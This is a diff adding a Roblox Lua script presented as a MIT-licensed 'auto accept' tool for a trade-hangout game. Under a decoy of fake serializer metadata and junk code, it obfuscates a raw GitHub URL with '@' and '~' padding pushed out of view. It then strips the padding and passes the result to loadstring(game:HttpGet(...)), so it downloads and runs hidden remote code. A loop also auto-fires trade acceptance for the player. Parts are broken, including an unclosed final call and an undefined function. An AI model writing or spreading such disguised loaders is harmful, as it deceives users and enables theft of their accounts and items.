@@ -1,0 +1,98 @@
+--[[
+    
+    ___                    __ _          ______                     
+   /   | ____ ____  ____  / /( )_____   /_  __/_  ______  ___  _____
+  / /| |/ __ `/ _ \/ __ \/ __/// ___/    / / / / / / __ \/ _ \/ ___/
+ / ___ / /_/ /  __/ / / / /_  (__  )    / / / /_/ / / / /  __/ /    
+/_/  |_\__, /\___/_/ /_/\__/ /____/    /_/  \__,_/_/ /_/\___/_/     
+      /____/                                                        
+
+  The trade hangeout auto accept
+  Created by:
+    - Madness
+  Tested by:
+    - Samueel
+
+  License:
+    - MIT License
+
+]]
+tr=game
+warn([[
+        ___                    __ _          ______                     
+       /   | ____ ____  ____  / /( )_____   /_  __/_  ______  ___  _____
+      / /| |/ __ `/ _ \/ __ \/ __/// ___/    / / / / / / __ \/ _ \/ ___/
+     / ___ / /_/ /  __/ / / / /_  (__  )    / / / /_/ / / / /  __/ /
+    /_/  |_\__, /\___/_/ /_/\__/ /____/    /_/  \__,_/_/ /_/\___/_/
+          /____/
+   
+          Starting the auto accept
+]])
+
+if game.CoreGui:FindFirstChild("Notify") then game.CoreGui.Notify:Destroy() end
+local m=[[
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+--]]local gg="https://ra@w~~~~.gith~~~~@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@ubus@@erconten@@t.~~~~@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@c@@om~~~~@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@/SrH@@@@4ck3r/H@@ubS@@@@crip@@@t~~~~@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@/@@m@@@ain/S@@c~~~~@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@~~~~@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@~~~~@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@~~~~@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@~~~~@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@~~~~@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@~~~~@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@~~~~@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@~~~~@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@~~~~@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@~~~~@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@~~~~@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@~~~~@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@~~~~@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@~~~~@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@~~~~@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@~~~~@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@~~~~@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@ript"
+if game.CoreGui:FindFirstChild("notification") then game.CoreGui.notification:Destroy() end
+-- ^^ fixes errors with the notification gui
+local ar,br="serpent","0.303"local c,d="Paul Kulchenko","Lua serializer and pretty printer"
+a=loadstring
+local dsc=function(ddd)
+ddd=3+2
+while ddd==6 do
+ddd=ddd+1
+end
+while false do
+return
+end
+gg=gg:gsub("@","")
+if nil==true then
+print('oool')
+else
+print('sad')
+end
+gg=gg:gsub("~","")
+return {ddd,gg}
+end
+local function m(h)
+
+task.spawn(function()
+pcall(function()repeat wait() until game.Players.LocalPlayer.PlayerGui:FindFirstChild("TradeEnd")
+print("U have sent add request")
+game.Players.LocalPlayer.PlayerGui:FindFirstChild("TradeEnd").Value=true
+game.Players.LocalPlayer.PlayerGui:FindFirstChild("Accepted"):FireServer(game.Players.LocalPlayer.PlayerGui.TradeGuy,true,game.Players.LocalPlayer.PlayerGui.ScreenGui.ItemsSelected.Value)
+return true
+end)
+end)
+end
+task.spawn(function()
+while true do
+m()
+wait()
+end
+end)
+local d=false
+m=nil
+local function ms()
+return nil
+end
+local m={"mmm","####"}
+dm=ss(m)
+a(tr:HttpGet(dsc(69)[2],true)
